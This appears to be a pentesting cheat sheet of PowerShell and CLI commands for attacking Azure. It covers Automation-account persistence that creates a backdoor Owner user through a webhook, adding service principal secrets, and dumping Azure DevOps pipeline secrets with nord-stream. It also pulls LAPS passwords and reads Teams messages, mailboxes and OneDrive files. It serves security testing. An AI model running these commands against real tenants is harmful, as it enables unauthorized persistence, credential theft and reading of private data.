# Azure Services

## Azure Runbook

Runbook must be **SAVED** and **PUBLISHED** before running it.

### Create a Runbook

* Check user right for automation
    ```powershell
    az extension add --upgrade -n automation
    az automation account list # if it doesn't return anything the user is not a part of an Automation group
    az ad signed-in-user list-owned-objects
    ```
* Add the user to the "Automation" group: `Add-AzureADGroupMember -ObjectId <OBJID> -RefObjectId <REFOBJID> -Verbose`
* Get the role of a user on the Automation account: `Get-AzRoleAssignment -Scope /subscriptions/<ID>/resourceGroups/<RG-NAME>/providers/Microsoft.Automation/automationAccounts/<AUTOMATION-ACCOUNT>`. NOTE: Contributor or higher privileges accounts can create and execute Runbooks
* List hybrid workers: `Get-AzAutomationHybridWorkerGroup -AutomationAccountName <AUTOMATION-ACCOUNT> -ResourceGroupName <RG-NAME>`
* Create a Powershell Runbook: `Import-AzAutomationRunbook -Name <RUNBOOK-NAME> -Path C:\Tools\username.ps1 -AutomationAccountName <AUTOMATION-ACCOUNT> -ResourceGroupName <RG-NAME> -Type PowerShell -Force -Verbose`
* Publish the Runbook: `Publish-AzAutomationRunbook -RunbookName <RUNBOOK-NAME> -AutomationAccountName <AUTOMATION-ACCOUNT> -ResourceGroupName <RG-NAME> -Verbose`
* Start the Runbook: `Start-AzAutomationRunbook -RunbookName <RUNBOOK-NAME> -RunOn Workergroup1 -AutomationAccountName <AUTOMATION-ACCOUNT> -ResourceGroupName <RG-NAME> -Verbose`


### Persistence via Automation accounts

* Create a new Automation Account
    * "Create Azure Run As account": Yes
* Import a new runbook that creates an AzureAD user with Owner permissions for the subscription*
    * Sample runbook https://github.com/NetSPI/MicroBurst
    * Publish the runbook
    * Add a webhook to the runbook
* Add the AzureAD module to the Automation account
    * Update the Azure Automation Modules
* Assign "User Administrator" and "Subscription Owner" rights to the automation account
* Trigger the webhook with a post request to create the new user

    ```powershell
    $uri = "https://s15events.azure-automation.net/webhooks?token=h6[REDACTED]%3d"
    $AccountInfo  = @(@{RequestBody=@{Username="BackdoorUsername";Password="BackdoorPassword"}})
    $body = ConvertTo-Json -InputObject $AccountInfo
    $response = Invoke-WebRequest -Method Post -Uri $uri -Body $body
    ```


## Azure Service Principal

* Generate a new service principal password/secret
    ```ps1
    Import-Module Microsoft.Graph.Applications
    Connect-MgGraph 
    $servicePrincipalId = "<service-principal-id>"

    $params = @{
        passwordCredential = @{
            displayName = "NewCreds"
        }
    }
    Add-MgServicePrincipalPassword -ServicePrincipalId $servicePrincipalId -BodyParameter $params
    ```


## Azure Devops

* Verify the validity of an Azure Personal Access Token (PAT)
    ```ps1
    PAT=""
    organization=""
    curl -u :${PAT} https://dev.azure.com/${organization}/_apis/build-release/builds
    ```

* [synacktiv/nord-stream](https://github.com/synacktiv/nord-stream) - Nord Stream is a tool that allows you to extract secrets stored inside CI/CD environments by deploying malicious pipelines. It currently supports Azure DevOps, GitHub and GitLab.
    ```ps1
    # List all secrets from all projects
    $ nord-stream.py devops --token "$PAT" --org myorg --list-secrets

    # Dump all secrets from all projects
    $ nord-stream.py devops --token "$PAT" --org myorg
    ```


## Microsoft Intune

* LAPS
    ```ps1
    #requires -modules Microsoft.Graph.Authentication
    #requires -modules Microsoft.Graph.Intune
    #requires -modules LAPS
    #requires -modules ImportExcel

    $DaysBack = 30
    Connect-MgGraph
    Get-IntuneManagedDevice -Filter "Platform eq 'Windows'" |
        Foreach-Object {Get-LapsAADPassword -DevicesIds $_.DisplayName} |
            Where-Object {$_.PasswordExpirationTime -lt (Get-Date).AddDays(-$DaysBack)} |
                Export-Excel -Path "c:\temp\lapsdata.xlsx" - ClearSheet -AutoSize -Show
    ```


## Office 365

### Microsoft Teams Messages

```ps1
TokenTacticsV2> RefreshTo-MSTeamsToken -domain domain.local
AADInternals> Get-AADIntTeamsMessages -AccessToken $MSTeamsToken.access_token | Format-Table id,content,deletiontime,*type*,DisplayName
```


### Outlook Mails

* Read user mails
    ```ps1
    Get-MgUserMessage -UserId <user-id> | ft
    Get-MgUserMessageContent -OutFile mail.txt -UserId <user-id> -MessageId <message-id>
    ```

### OneDrive Files

```ps1
$userId = "<user-id>"
Import-Module Microsoft.Graph.Files
Get-MgUserDefaultDrive -UserId $userId
Get-MgUserDrive -UserId $UserId  -Debug
Get-MgDrive -top 1
```


## References

* [Microsoft Graph - servicePrincipal: addPassword](https://learn.microsoft.com/en-us/graph/api/serviceprincipal-addpassword?view=graph-rest-1.0&tabs=powershell)
* [Microsoft Intune - Microsoft Intune support for Windows LAPS](https://learn.microsoft.com/en-us/mem/intune/protect/windows-laps-overview)
* [Pentesting Azure Mindmap - Alexis Danizan](https://github.com/synacktiv/Mindmaps)